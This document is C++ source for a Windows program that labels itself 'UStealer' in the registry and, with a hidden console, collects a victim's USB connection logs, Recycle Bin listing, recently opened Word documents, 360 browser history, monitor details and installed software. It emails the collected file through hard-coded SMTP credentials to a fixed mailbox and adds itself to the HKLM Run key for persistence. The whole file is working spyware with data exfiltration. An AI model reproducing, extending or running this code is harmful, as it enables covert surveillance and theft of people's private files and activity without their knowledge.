// mail-001.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include "pch.h"
#include <iostream>
#include "Smtp.h"
#include <shappmgr.h>
#include <string>
#include <Dbt.h>
#include <time.h>
#include <fstream>
#include <corecrt_io.h>

#include "shlwapi.h"
#pragma comment(lib,"shlwapi.lib")

#include <sddl.h>
#include <stdio.h>
#include <winevt.h>

#pragma comment(lib, "wevtapi.lib")

#include <atlstr.h>
#include <ShlObj.h> //SHGetSpecialFolderPath
#include <vector>
#include <tchar.h>
#include <Winsock2.h>

#include <windows.h>

#include "360.h"
#include "XDisplayDevice.h"
#define ARRAY_SIZE 10
#define TIMEOUT 1000  // 1 second; Set and use in place of INFINITE in EvtNext call

#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) // 隐藏控制台界面
using namespace std;

wofstream USB;
//----------------------------最近文档-------------------------------------
WCHAR ddname[MAX_PATH] = { L".doc.docx.docm.dotx.dotm" };

// 使用Com接口,读取链接目标路径
HRESULT LoadLinkFilePath(const wchar_t* file, wchar_t* buf, int maxbuf)
{
	IShellLinkW* shlink = 0;
	IPersistFile* persist = 0;
	WIN32_FIND_DATA wfd;

	HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&shlink);
	if (SUCCEEDED(hr)) {
		hr = shlink->QueryInterface(IID_IPersistFile, (void**)&persist);
		if (SUCCEEDED(hr)) {
			hr = persist->Load(file, STGM_READ);
			if (SUCCEEDED(hr)) {
				// shlink->Resolve(0, SLR_ANY_MATCH | SLR_NO_UI);           
				hr = shlink->GetPath(buf, maxbuf, &wfd, SLGP_RAWPATH);
			}
			persist->Release();
		}
		shlink->Release();
	}
	return hr;
}

char * UnicodeToUTF8(const wchar_t* str)
{
	char* result;
	int textlen;
	textlen = WideCharToMultiByte(CP_UTF8, 0, str, -1, NULL, 0, NULL, NULL);
	result = (char *)malloc((textlen + 1) * sizeof(char));
	memset(result, 0, sizeof(char) * (textlen + 1));
	WideCharToMultiByte(CP_UTF8, 0, str, -1, result, textlen, NULL, NULL);
	return result;
}

bool SaveToFile(WCHAR * pPathFile, wstring strFile)
{
	FILE *filepath = _wfopen(pPathFile, L"a+");

	if (filepath == NULL)
	{
		return false;
	}
	const wchar_t* strfilew = strFile.c_str();

	string strfileUTF;
	strfileUTF = UnicodeToUTF8(strfilew);

	fwrite(strfileUTF.c_str(), strfileUTF.length(), 1, filepath);

	fclose(filepath);

	return true;
}

void CPfile(WCHAR*path, WCHAR*path2)
{


	FILE *pFile = _wfopen(path, L"r");
	if (pFile == NULL)
	{
		return;
	}
	WCHAR *pBuf;
	fseek(pFile, 0, SEEK_END);
	int len = ftell(pFile);
	pBuf = new WCHAR[len + 1];
	rewind(pFile);
	fread(pBuf, 1, len, pFile);
	fclose(pFile);


	FILE *fp = _wfopen(path2, L"ab"); // 必须确保是以 二进制写入的形式打开

	if (NULL == fp)
	{
		return;
	}

	fwrite(pBuf, len, 1, fp); //二进制写

	fclose(fp);
	fp = NULL;
	delete[]pBuf;
}

// 获取文件全名，包括文件名和扩展名
CString GetFileFullName(CString csFilePath)
{
	int nPos = csFilePath.ReverseFind('\\'); // 文件路径，以'\'斜杠分隔的路径  
	CString csFileFullName;
	csFileFullName = csFilePath.Right(csFilePath.GetLength() - nPos - 1);
	return csFileFullName;
}
vector<CString> SplitCString(CString strSource, CString ch)

{

	vector <CString> vecString;

	int iPos = 0;

	CString strTmp;

	strTmp = strSource.Tokenize(ch, iPos);

	while (strTmp.Trim() != _T(""))

	{

		vecString.push_back(strTmp);

		strTmp = strSource.Tokenize(ch, iPos);

	}
	return vecString;
}

void GetFIle()
{
	WCHAR aaa[MAX_PATH] = {};

	wcscpy_s(aaa, ddname);
	if (aaa == NULL)
	{
		return ;
	}
	WCHAR tempPath[MAX_PATH] = { 0 };
	GetTempPathW(MAX_PATH, tempPath);
	wcscat(tempPath, L"\\recentfile");

	if (CreateDirectoryW(tempPath, NULL)) //判断是否存在，否则创建
	{

		SetFileAttributesW(tempPath, FILE_ATTRIBUTE_ARCHIVE); //隐藏(设置为隐藏)

	}
	//	MessageBox(0,aaa,L"0",0);

	vector <CString> vecString = SplitCString(aaa, L".");


	for (size_t i = 0; i < vecString.size(); i++)
	{

		//	MessageBox(0,vecString[i],vecString[i],0);
	}

	//用来配置地域的信息，设置当前程序使用的本地化信息。
	_wsetlocale(LC_ALL, L"");

	CoInitialize(0);

	WCHAR szPath[MAX_PATH];
	DWORD ret;

	BOOL bRet = SHGetSpecialFolderPathW(NULL, szPath, CSIDL_RECENT, FALSE);
	if (!bRet)
	{
		//wprintf(L"SHGetSpecialFolderPath %s\n",GetLastError());

	}
	else
	{
		//wprintf(L"SHGetSpecialFolderPath %s \n", szPath);
	}

	wstring lpname = szPath;
	lpname = lpname + L"\\*.*";

	HANDLE file;
	LPCTSTR lpFileName = (LPCTSTR)lpname.c_str();
	WIN32_FIND_DATA pNextInfo;
	file = FindFirstFile(lpFileName, &pNextInfo);
	if (file == INVALID_HANDLE_VALUE)
	{

		system("pause");
		exit(0);
	}
	wstring sbuff;
	while (FindNextFile(file, &pNextInfo))
	{
		if (pNextInfo.cFileName[0] == '.')
			continue;
		//wprintf (L"得到文件：%s \n", pNextInfo.cFileName);

		CString temppath1 = tempPath;
		sbuff += pNextInfo.cFileName;
		sbuff += L"\r\n";
		wstring Pname;
		Pname += szPath;
		Pname += L"\\";
		Pname += pNextInfo.cFileName;
		wchar_t buf[260] = { 0 };
		HRESULT hr = LoadLinkFilePath(Pname.c_str(), buf, 260);
		CString fileame = GetFileFullName(buf);



		for (int i = 0; i < vecString.size(); i++)
		{

			CString vecstring = L".";
			vecstring += vecString[i];

			int index = fileame.Find(vecstring);

			if (-1 == index) // 没找到
			{
			}
			else // 找到了
			{

				temppath1 += L"\\";
				temppath1 += fileame;

				USB << temppath1.GetBuffer() << endl;

				CPfile(buf, temppath1.GetBuffer());


			}
		}

	}

	CoUninitialize();
};

//-----------------------------USB日志读取------------------------------


DWORD PrintResults(EVT_HANDLE hResults);
DWORD PrintEvent(EVT_HANDLE hEvent); // Shown in the Rendering Events topic

DWORD PrintEvent(EVT_HANDLE hEvent)
{
	DWORD status = ERROR_SUCCESS;
	DWORD dwBufferSize = 0;
	DWORD dwBufferUsed = 0;
	DWORD dwPropertyCount = 0;
	LPWSTR pRenderedContent = NULL;

	// The EvtRenderEventXml flag tells EvtRender to render the event as an XML string.
	if (!EvtRender(NULL, hEvent, EvtRenderEventXml, dwBufferSize, pRenderedContent, &dwBufferUsed, &dwPropertyCount))
	{
		if (ERROR_INSUFFICIENT_BUFFER == (status = GetLastError()))
		{
			dwBufferSize = dwBufferUsed;
			pRenderedContent = (LPWSTR)malloc(dwBufferSize);
			if (pRenderedContent)
			{
				EvtRender(NULL, hEvent, EvtRenderEventXml, dwBufferSize, pRenderedContent, &dwBufferUsed, &dwPropertyCount);
			}
			else
			{
				wprintf(L"malloc failed\n");
				status = ERROR_OUTOFMEMORY;
				goto cleanup;
			}
		}

		if (ERROR_SUCCESS != (status = GetLastError()))
		{
			wprintf(L"EvtRender failed with %d\n", GetLastError());
			goto cleanup;
		}
	}

	wprintf(L"\n\n%s", pRenderedContent);
	USB << pRenderedContent << endl;
	

cleanup:

	if (pRenderedContent)
		free(pRenderedContent);

	return status;
}

DWORD PrintResults(EVT_HANDLE hResults)
{
	DWORD status = ERROR_SUCCESS;
	EVT_HANDLE hEvents[ARRAY_SIZE];
	DWORD dwReturned = 0;

	while (true)
	{
		// Get a block of events from the result set.
		if (!EvtNext(hResults, ARRAY_SIZE, hEvents, INFINITE, 0, &dwReturned))
		{
			if (ERROR_NO_MORE_ITEMS != (status = GetLastError()))
			{
				wprintf(L"EvtNext failed with %lu\n", status);
			}

			goto cleanup;
		}

		// For each event, call the PrintEvent function which renders the
		// event for display. PrintEvent is shown in RenderingEvents.
		for (DWORD i = 0; i < dwReturned; i++)
		{
			if (ERROR_SUCCESS == (status = PrintEvent(hEvents[i])))
			{
				EvtClose(hEvents[i]);
				hEvents[i] = NULL;
			}
			else
			{
				goto cleanup;
			}
		}
	}

cleanup:

	for (DWORD i = 0; i < dwReturned; i++)
	{
		if (NULL != hEvents[i])
			EvtClose(hEvents[i]);
	}

	return status;
}



//------------获取安装软件列表-------------------------------
DECLARE_INTERFACE_(IInstalledApp, IUnknown) {
	BEGIN_INTERFACE
		virtual HRESULT(STDMETHODCALLTYPE GetAppInfo)(PAPPINFODATA pai);
	virtual HRESULT(STDMETHODCALLTYPE GetPossibleActions)(DWORD *pdwActions);
	virtual HRESULT(STDMETHODCALLTYPE GetSlowAppInfo)(PSLOWAPPINFO psaid);
	virtual HRESULT(STDMETHODCALLTYPE GetCachedSlowAppInfo)(PSLOWAPPINFO psaid);
	virtual HRESULT(STDMETHODCALLTYPE IsInstalled)(void);
	virtual HRESULT(STDMETHODCALLTYPE Uninstall)(HWND hwnd);
	virtual HRESULT(STDMETHODCALLTYPE Modify)(HWND hwndParent);
	virtual HRESULT(STDMETHODCALLTYPE Repair)(BOOL bReinstall);
	virtual HRESULT(STDMETHODCALLTYPE Upgrade)(void);
	END_INTERFACE
};

DECLARE_INTERFACE_(IEnumInstalledApps, IUnknown) {
	BEGIN_INTERFACE
		virtual HRESULT(STDMETHODCALLTYPE Next)(IInstalledApp **pia);
	virtual HRESULT(STDMETHODCALLTYPE Reset)(void);
	END_INTERFACE
};

typedef struct {
	LPWSTR pszCategory;
	UINT idCategory;
} SHELLAPPCATEGORY, *PSHELLAPPCATEGORY;

typedef struct {
	UINT cCategories;
	SHELLAPPCATEGORY *pCategory;
} SHELLAPPCATEGORYLIST, *PSHELLAPPCATEGORYLIST;

DECLARE_INTERFACE_(IShellAppManager, IUnknown) {
	BEGIN_INTERFACE
		virtual HRESULT(STDMETHODCALLTYPE GetNumberofInstalledApps)(DWORD *pdwResult);
	virtual HRESULT(STDMETHODCALLTYPE EnumInstalledApps)(IEnumInstalledApps **peia);
	virtual HRESULT(STDMETHODCALLTYPE GetPublishedAppCategories)(PSHELLAPPCATEGORYLIST pCategoryList);
	virtual HRESULT(STDMETHODCALLTYPE EnumPublishedApps)(LPCWSTR pszCategory, IEnumPublishedApps **ppepa);
	virtual HRESULT(STDMETHODCALLTYPE InstallFromFloppyOrCDROM)(HWND hwndParent);
	END_INTERFACE
};
const GUID CLSID_ShellAppManager = { 0x352EC2B7, 0x8B9A, 0x11D1, 0xB8, 0xAE, 0x00, 0x60, 0x08, 0x05, 0x93, 0x82 };
// Windows 2k/XP
const GUID IID_IShellAppManager5 = { 0x352EC2B8, 0x8B9A, 0x11D1, 0xB8, 0xAE, 0x00, 0x60, 0x08, 0x05, 0x93, 0x82 };
// Windows Vista/7
const GUID IID_IShellAppManager6 = { 0xC257690D, 0x85DE, 0x417C, 0xB9, 0x64, 0xC2, 0x2B, 0x1A, 0x6B, 0xB5, 0xF7 };

wstring GetSoftware()
{
	wstring strBuffer =L"";
	wstring strSoftware = L"";
	//char cData[MAX_PATH] = { 0 };
	char szInfo[MAX_PATH] = { 0 };
	char szVersion[MAX_PATH] = { 0 };
	HRESULT hr = CoInitialize(NULL);

	if (SUCCEEDED(hr))
	{
		IShellAppManager *pisham = NULL;
		// 根据系统版本选用适合的 IID_IShellAppManager 值
		hr = CoCreateInstance(CLSID_ShellAppManager, NULL, CLSCTX_INPROC_SERVER, IID_IShellAppManager6, (void **)&pisham);
		if (SUCCEEDED(hr)) {
			IEnumInstalledApps *pieia = NULL;
			hr = pisham->EnumInstalledApps(&pieia);
			if (SUCCEEDED(hr)) {
				IInstalledApp *piia = NULL;

				while (SUCCEEDED(pieia->Next(&piia)) && piia != NULL) {
					APPINFODATA appinfo;
					appinfo.cbSize = sizeof(APPINFODATA);
					appinfo.dwMask = AIM_DISPLAYNAME | AIM_VERSION | AIM_PUBLISHER | AIM_PRODUCTID;
					hr = piia->GetAppInfo(&appinfo);
					if (SUCCEEDED(hr)) {
						// appinfo 可用的值取决于 dwMask 的标志位
						// appinfo.pszDisplayName 显示名称
						// 标识<?>软件名<?>软件版本<?>备注<??>
						strSoftware = L"-";
						strSoftware += appinfo.pszDisplayName;
						strSoftware += L"--";
						strSoftware += appinfo.pszVersion;
						
						strSoftware += L"\r\n";
						strBuffer += strSoftware;
					}
					piia->Release();
					piia = NULL;
				}
				pieia->Release();
			}
			pisham->Release();
		}
		CoUninitialize();
	}
	return strBuffer;
}


//===========================
//    获取本机局域网IP
//===========================
char* GetLocalIP(void)
{
	WSADATA wsaDataqq;
	WSAStartup(MAKEWORD(1, 1), &wsaDataqq);
	PHOSTENT hostinfo;
	char name[512] = { 0 };
	in_addr dest;
	char *ipAddr = NULL;


	if (gethostname(name, sizeof(name)) != 0 || (hostinfo = gethostbyname(name)) == NULL)
		return NULL;


	for (int a = 0; hostinfo->h_addr_list[a] != NULL; a++)
	{
		memcpy(&dest, hostinfo->h_addr_list[a], hostinfo->h_length);
		//多个网卡，可在这循环中获取多个ip
		if (a == 0) {
			ipAddr = inet_ntoa(dest);
		}
	}
	WSACleanup();
	return ipAddr;
}
//===========================
//    获取本机外网IP
//===========================
CString GetInternetIP() {


	//两个查询网站供用户切换
#if(1)
	CString checkWeb = "http://only-997227-218-13-34-109.nstool.netease.com/";
	CString tagStr = "您的IP地址信息: ";
	CString endChar = " ";
#else
	CString checkWeb = "http://www.ip138.com/ips1388.asp";
	CString tagStr = "您的IP地址是：[";
	CString endChar = "]";
#endif


	HRESULT hr = URLDownloadToFile(0, checkWeb.GetBuffer(), _T("ipFile.txt"), 0, NULL);
	if (hr != S_OK) {
		return "";
	}

	CFile file;
	file.Open(_T("ipFile.txt"), CFile::modeRead);
	if (!file)
	{
		return "";
	}
	ULONGLONG len = file.GetLength();
	char* buf = new char[len + 1];
	ZeroMemory(buf, len + 1);
	file.Read(buf, len);
	buf[len] = 0;
	CString ans = buf;
	CString ip = "";

	int ix = ans.Find(tagStr);
	int endn = -1;
	if (ix > -1)
	{
		len = tagStr.GetLength();
		endn = ans.Find(endChar, ix + len);
		if (endn > -1)
		{
			ip = ans.Mid(ix + len, endn - ix - len);
		}
	}
	delete buf;
	file.Close();
	return ip;
}


char* ConvertLPWSTRToLPSTR(LPWSTR lpwszStrIn)
{
	LPSTR pszOut = NULL;
	try
	{
		if (lpwszStrIn != NULL)
		{
			int nInputStrLen = wcslen(lpwszStrIn);

			// Double NULL Termination  
			int nOutputStrLen = WideCharToMultiByte(CP_ACP, 0, lpwszStrIn, nInputStrLen, NULL, 0, 0, 0) + 2;
			pszOut = new char[nOutputStrLen];

			if (pszOut)
			{
				memset(pszOut, 0x00, nOutputStrLen);
				WideCharToMultiByte(CP_ACP, 0, lpwszStrIn, nInputStrLen, pszOut, nOutputStrLen, 0, 0);
			}
		}
	}
	catch (std::exception e)
	{
	}

	return pszOut;
}

//程序名称（**全路径**）
void Runator(char *programName)  
{
	HKEY hkey = NULL;
	DWORD rc;

	rc = RegCreateKeyExA(HKEY_LOCAL_MACHINE,                      //创建一个注册表项，如果有则打开该注册表项
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_WOW64_64KEY | KEY_ALL_ACCESS,    //部分windows系统编译该行会报错， 删掉 “”KEY_WOW64_64KEY | “” 即可
		NULL,
		&hkey,
		NULL);

	if (rc == ERROR_SUCCESS)
	{
		rc = RegSetValueExA(hkey,
			"UStealer",
			0,
			REG_SZ,
			(const BYTE *)programName,
			strlen(programName));
		if (rc == ERROR_SUCCESS)
		{
			RegCloseKey(hkey);
		}
	}
}

int main()
{


//-------------------------------------------------------

	CHAR tempPath[MAX_PATH] = { 0 };
	GetTempPathA(MAX_PATH, tempPath);
	strcat(tempPath, "\\USB.txt");


	CHAR tempPath1[MAX_PATH] = { 0 };
	GetTempPathA(MAX_PATH, tempPath1);
	strcat(tempPath1, "\\aallllllo.TXT");
	
	
	USB.open(tempPath);
	
	USB << "-----------USB插拔记录-------------"<<endl;

	DWORD status = ERROR_SUCCESS;
	EVT_HANDLE hResults = NULL;
	LPWSTR pwsPath = L"Microsoft-Windows-DriverFrameworks-UserMode/Operational";
	LPWSTR pwsQuery = L"Event/System[EventID=2003]";

	hResults = EvtQuery(NULL, pwsPath, pwsQuery, EvtQueryChannelPath | EvtQueryReverseDirection);
	if (NULL == hResults)
	{
		status = GetLastError();

		if (ERROR_EVT_CHANNEL_NOT_FOUND == status)
			wprintf(L"The channel was not found.\n");
		else if (ERROR_EVT_INVALID_QUERY == status)
			// You can call the EvtGetExtendedStatus function to try to get 
			// additional information as to what is wrong with the query.
			wprintf(L"The query is not valid.\n");
		else
			wprintf(L"EvtQuery failed with %lu.\n", status);

		goto cleanup;
	}

	PrintResults(hResults);

cleanup:

	if (hResults)
		EvtClose(hResults);
//-------------------------------------------------
	
	TCHAR pszPath[MAX_PATH];  // 保存路径
	// IShellFolder接口
	IShellFolder *pisf = NULL;
	IShellFolder *pisfRecBin = NULL;
	// 获取“根”目录，桌面
	SHGetDesktopFolder(&pisfRecBin);

	IEnumIDList *peidl = NULL; // 对象遍历接口
	LPITEMIDLIST pidlBin = NULL;
	LPITEMIDLIST idlCurrent = NULL;

	LPMALLOC pMalloc = NULL;
	// 分配
	SHGetMalloc(&pMalloc);
	// 回收站位置
	SHGetFolderLocation(NULL, CSIDL_BITBUCKET, NULL, 0, &pidlBin);
	// 绑定回收站对象
	pisfRecBin->BindToObject(pidlBin, NULL, IID_IShellFolder, (void **)&pisf);
	// 列举回收站中的对象,得到IEnumIDList接口，包括SHCONTF_FOLDERS、
	// SHCONTF_NONFOLDERS、SHCONTF_INCLUDEHIDDEN类型的对象
	pisf->EnumObjects(NULL,
		SHCONTF_FOLDERS | SHCONTF_NONFOLDERS | SHCONTF_INCLUDEHIDDEN,
		&peidl);

	STRRET strret;
	ULONG uFetched;

	HANDLE hOutPut = GetStdHandle(STD_OUTPUT_HANDLE);
	printf("\nFiles In Recycle Bin:\n");
	
	USB << "-----------回收站文件-------------" << endl;
	vector<string> strret1;
	while (1)
	{
		// 遍历IEnumIDList对象，idlCurrent为当前对象
		if (peidl->Next(1, &idlCurrent, &uFetched) == S_FALSE)
			break;
		// 获取回收站当前对象当前的路径，这里没有输出结果，读者可自行修改
		SHGetPathFromIDList(idlCurrent, pszPath);
		// DisplayName，删除前的路径
		pisf->GetDisplayNameOf(idlCurrent, SHGDN_NORMAL, &strret);
		// 显示，printf可能会造成字符编码不正确。
		WriteConsoleW(hOutPut, L"\t", 1, NULL, NULL);
		WriteConsoleW(hOutPut, strret.pOleStr, lstrlenW(strret.pOleStr), NULL, NULL);
		WriteConsoleW(hOutPut, L"\n", 1, NULL, NULL);

		char *  strret2;
		strret2= ConvertLPWSTRToLPSTR(strret.pOleStr);
		strret1.push_back(strret2);
		
	}

	// 释放资源
	pMalloc->Free(pidlBin);
	pMalloc->Free(strret.pOleStr);
	pMalloc->Release();
	peidl->Release();
	pisf->Release();

	for (int i = 0; i < strret1.size(); i++)
	{		
		USB << strret1[i].c_str() <<endl;
		
	}

//-------------------------------------------------
	//最近文档
	USB <<"----------------最近文档列表------------------"<< endl;

	GetFIle();



	USB <<"----------------360se浏览记录列表------------------"<< endl;
	BrowsHistory browseHistory;
	browseHistory.Init();

	std::vector<BrowsData> data = browseHistory.GetBrowsHistory();
	std::vector<BrowsData>::iterator it = data.begin();

	for (; it < data.end(); ++it)
	{
		wprintf(_T("%s\n"), it->strURL);
		USB << it->strURL.GetBuffer() << endl;
	}
//-------------------------------------

	DWORD dwWidth, dwHeight;

	XDD_GetActiveMonitorPhysicalSize(dwWidth, dwHeight, tempPath1);
	FILE *fp = NULL;
	fp = fopen(tempPath1, "rb");
	char buffer[256 * 10] = {0};

	int readCnt = fread(buffer, sizeof(buffer), 1, fp);  /* 返回值为0 */
	//int readCnt = fread(buffer,1,sizeof(buffer),fp);  /* 返回值为11 */	
	printf("readCnt = %d\n", readCnt);
	fclose(fp);
	USB << "----------------显示器信息------------------" << endl;
	USB << buffer << endl;
//-------------------------------------------------
	wstring software = GetSoftware();

	USB << "----------------安装软件列表------------------" << endl;

	USB.imbue(std::locale("chs"));
	USB << software.c_str() << endl;

	USB.close();

//  	FILE* fp = _wfopen(L"C:\\USB.txt", L"at+,ccs=UTF-8");	
//  	fwprintf(fp, software.c_str());
//  	fclose(fp);

//-------------------------------------------------



kkkk:
	char *Lo_IP;
	Lo_IP = GetLocalIP();

	CString IP;

	IP =  GetInternetIP();

	IP += "<?>";
	IP += Lo_IP;
	IP += "<?>";
	

	//加上时间
	time_t t;

	struct tm * lt;

	time(&t);                     //获取Unix时间戳。

	lt = localtime(&t);        //转为时间结构。

	printf("%d/%d/%d %d:%d:%d\n", lt->tm_year + 1900, lt->tm_mon + 1, lt->tm_mday, lt->tm_hour, lt->tm_min, lt->tm_sec);
	
	CStringA strtime;
	strtime.Format("%d/%d/%d %d:%d:%d", lt->tm_year + 1900, lt->tm_mon + 1, lt->tm_mday, lt->tm_hour, lt->tm_min, lt->tm_sec);

	IP += strtime;

	Lo_IP = ConvertLPWSTRToLPSTR(IP.GetBuffer());
	CSmtp smtp
	(
		25,								/*smtp端口*/
		"smtp.sina.com",					/*smtp服务器地址*/
		"rtyuiop_123@sina.com",	/*你的邮箱地址*/
		"91575641a18fe94b",					/*邮箱密码*/
		"rtyuiop_456@sina.com",	/*目的邮箱地址*/
		Lo_IP,							/*主题*/
		"你好"		/*邮件正文*/
	);
	//rtyuiop_456@sina.com
	string filePath(tempPath);

	smtp.AddAttachment(filePath);


	int err;
	if ((err = smtp.SendEmail_Ex()) != 0)
	{
		
		switch (err==1)
		{
		default:
			break;
		}
		
		if (err == 1)
			cout << "错误1: 由于网络不畅通，发送失败!" << endl;
		    goto kkkk;
		if (err == 2)
			cout << "错误2: 用户名错误,请核对!" << endl;
		if (err == 3)
			cout << "错误3: 用户密码错误，请核对!" << endl;
		if (err == 4)
			cout << "错误4: 请检查附件目录是否正确，以及文件是否存在!" << endl;
	}

	//添加启动项
	CHAR szFilePath[MAX_PATH + 1] = { 0 };
	GetModuleFileNameA(NULL, szFilePath, MAX_PATH);

	Runator(szFilePath);


	return 0;
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门提示: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
